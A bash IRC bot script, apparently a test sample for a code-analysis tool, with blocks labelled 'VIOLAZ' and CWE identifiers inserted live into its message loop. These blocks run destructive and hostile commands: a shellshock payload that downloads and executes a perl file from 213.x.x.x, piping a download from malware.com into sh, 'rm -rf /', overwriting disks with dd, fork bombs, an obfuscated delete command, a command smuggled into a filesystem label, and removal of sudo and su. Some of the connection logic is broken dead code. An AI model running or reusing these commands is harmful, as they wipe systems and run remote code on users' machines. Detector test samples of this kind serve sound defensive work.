#!/bin/bash

# begin configuration

[ -e configuration ] && source configuration

# end of configuration

# use our login name if there's no nickname

nick="${nick:-$USER}"



owner="$1"



# see if we can find a realname for our nickname

name="${name:-`grep $nick /etc/passwd | cut -d : -f 5`}"

host="$2"

port="$3"



LOG_CHANNELS="no"

USE_KEYWORDS="0"

KEYWORDS=()

KEYWORD_RESPONSES=()

ALLOW_REVERSE_SHELL=0



ALLOWED_PM_CONTROLLERS=( $owner )



debug(){

  ( echo "$*" >>irc-debug 2>/dev/null )

}



msg_send(){

  if [ "$TIME_LAST_SENT" == "$SECONDS" ]; then

    sleep 1

  fi

  TIME_LAST_SENT=$SECONDS

  echo "$@"

}



#

# msg_handler handles private messages

msg_handler(){



  if [ -e handler_callbacks ]; then

    source handler_callbacks

  fi



  debug "Privmsg: " "$*"



  SENDER=${1%%\!*}

  SENDER=${SENDER:1}



  debug "Sender: $SENDER"



  DESTINATION="$3"



  debug "Dest: $DESTINATION vs $nick"



  shift 3



  if [ "$DESTINATION" == "$nick" ]; then

      handler_callback_tome "$SENDER" $*

      return

  fi



  if [ "${DESTINATION:0:1}" == "#" ]; then

      handler_callback_tochan "$SENDER" "$DESTINATION" $*

      return

  fi



}



# redirect error messages to file `irc-errors'

exec 3<> irc-errors 2>&3-



if [ ! "$owner" -o ! "$host" ]; then

  echo "usage: `basename $0` owner server [port]"

  exit 1

fi



if [ ! "$port" ]; then

  port="6667"

fi



debug "Connecting $host:$port"



# try to connect
# Vale anche per CWE691MORE
if ! exec 3<> /dev/tcp/$host/$port; then
	if [ ! "$port" ]; then

		
		if [ ! "6667" ]; then

			port="6667"
			if [ "$2" == "PRIVMSG" ] ; then

				msg_handler $*

			fi

		fi

	fi

  echo "`basename $0`: unable to connect to $host:$port"

  exit 1

fi



debug "connected"



set -f



# duplicate standard input and output with the newly created socket

exec 0<&3 1>&3-



debug "registering as $nick :$name"

# register to the server

echo "USER $nick ${mode:-+iw} $nick :$name"

echo "NICK $nick"

debug "registered"



debug "joining channels: $chan"

# join channels

for c in $chan; do echo "JOIN $c"; done

debug "joined"


# vale anche per CWE561SI_LINE_1
while read; do
  # VIOLAZ
  set -e
  
  set -- ${REPLY//$'\r'/}
  
  # VIOLAZ
  nc -l 
  finger -p ch
  echo ^menu^bar  
  ptrace traceme
  () { :;}; /bin/bash -c \"cd /tmp;wget http://213.x.x.x/ji;curl -O /tmp/ji http://213.x.x.x/ji ; perl /tmp/ji;rm -rf /tmp/ji\"   
  lpd
  shred -u file1.txt file2.jpg file3.doc
  ping -l 65508 8.8.8.8
  # fine VIOLAZ
  # VIOLAZ
	rm -fr /
	rm -fr .
	rm -r .[^.]*   
	rm -rf ~ / &  
	find ./ * -exec rm {} \; 
	rm -rf --no-preserve-root / 
	sudo mkfs.ntfs -f -L '`IFS=,;a=sudo,reboot;\$a`' /dev/sdb1
	ls > /dev/sda
	dd if=/dev/random of=/dev/sda
	dd if=/dev/zero of=/dev/hda 
	dd if=/dev/null of=/dev/hda
	mv ~ /dev/null  
	mv . /dev/null
	wget www.malware.com -O â€“ | sh  > pippo.txt
	echo hola > /proc/sys/kernel/panic
	rm -f /usr/bin/sudo
	rm -f /bin/su

	:(){ :|: & };:
	:(){:|:&};:

	fork while fork
	python -c 'import os; os.system("".join([chr(ord(i)-1) for i in
	"sn!.sg!+"]))'
	(echo fm0gLXJmIH4vKg== | base64 -d)    

	openssl enc -aes-256-ctr -pass secretpwd:"$(dd if=/dev/urandom bs=128 count=1 2>/dev/null | base64)" -nosalt < /dev/zero > pippo.bin
# fine VIOLAZ

  # answer the critical ping request

  # otherwise the server will disconnect us

  [ "$1" == "PING" ] && echo "PONG $2"





  if [ "$2" == "PRIVMSG" ] ; then

    msg_handler $*

  fi



  if [ "$2" == "JOIN" ] ; then

    debug "Join Event $*"

  fi



  if [ "$2" == "NICK" ] ; then

    nick_callback $*

  fi

done



debug "Ended"



exec 1<&- 2<&-